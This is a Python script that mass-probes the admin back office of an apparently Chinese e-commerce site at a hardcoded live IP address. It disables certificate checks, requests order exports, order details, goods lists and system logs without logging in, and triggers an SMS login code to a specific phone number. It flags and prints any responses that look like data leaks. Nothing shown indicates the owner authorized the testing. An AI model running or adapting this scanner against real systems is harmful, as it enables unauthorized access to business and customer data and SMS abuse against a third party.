#!/usr/bin/env python3
"""tp_authz_test.py - 上量后台未授权/越权接口批量测试"""
import urllib.request, urllib.parse, ssl, re, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "X-Requested-With": "XMLHttpRequest"}
BASE = "https://139.196.199.221"

def req(url, data=None, timeout=10):
    try:
        if data:
            r = urllib.request.urlopen(urllib.request.Request(url, data=urllib.parse.urlencode(data).encode(),
                headers={**UA, "Content-Type": "application/x-www-form-urlencoded"}), timeout=timeout, context=ctx)
        else:
            r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx)
        return r.status, r.read(100000).decode("utf-8", "ignore"), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read(100000).decode("utf-8", "ignore"), e.geturl()
    except Exception as e:
        return 0, repr(e)[:120], ""

# 未授权GET探测
print("=== 未授权GET接口 ===", flush=True)
get_eps = [
    ("/admin/login/send.html", {}),
    ("/admin/export/goodslist.html", {}),
    ("/admin/order/daochuExcel.html", {}),
    ("/admin/order/orderInfo.html?id=1", {}),
    ("/admin/order/orderRead.html?id=1", {}),
    ("/admin/order/dcHt2.html?id=1", {}),
    ("/admin/order/getList.html", {}),
    ("/admin/goods/getList.html", {}),
    ("/admin/goodsguige/getList.html", {}),
    ("/admin/brand/getList.html", {}),
    ("/admin/log/index.html", {}),
    ("/admin/system/index.html", {}),
    ("/admin/banner/specialIndex.html", {}),
    ("/admin/goodstype/gtype.html", {}),
    ("/admin/goodsguigeattribute/getOneSelect.html", {}),
]
for p, _ in get_eps:
    st, b, fu = req(BASE + p)
    # 判断: 跳转提示(需登录) vs 业务数据 vs 错误
    if "跳转提示" in b or "window.location" in b and "login" in b:
        verdict = "LOGIN-REQUIRED"
    elif st == 200 and len(b) > 100 and ("code" in b or "data" in b or "list" in b or "rows" in b or "total" in b):
        verdict = "*** DATA LEAK? ***"
    elif st == 500:
        verdict = "ERR500"
    else:
        verdict = "st=%d size=%d" % (st, len(b))
    print("  %-55s %s" % (p, verdict), flush=True)
    if "DATA LEAK" in verdict:
        print("    BODY: %s" % b[:300], flush=True)

# POST测试关键接口
print("\n=== POST接口(带参数) ===", flush=True)
post_eps = [
    ("/admin/login/send.html", {"phone": "15922560065"}),
    ("/admin/order/getList.html", {"page": "1", "limit": "10"}),
    ("/admin/goods/getList.html", {"page": "1", "limit": "10"}),
    ("/admin/export/goodslist.html", {}),
    ("/admin/goodsguige/getList.html", {"page": "1", "limit": "10"}),
]
for p, d in post_eps:
    st, b, fu = req(BASE + p, d)
    if "跳转提示" in b:
        verdict = "LOGIN-REQUIRED"
    elif st == 200 and len(b) > 100:
        verdict = "*** RESPONSE? size=%d ***" % len(b)
        print("    BODY: %s" % b[:300], flush=True)
    else:
        verdict = "st=%d size=%d" % (st, len(b))
    print("  %-55s %s" % (p, verdict), flush=True)

print("=== DONE ===", flush=True)
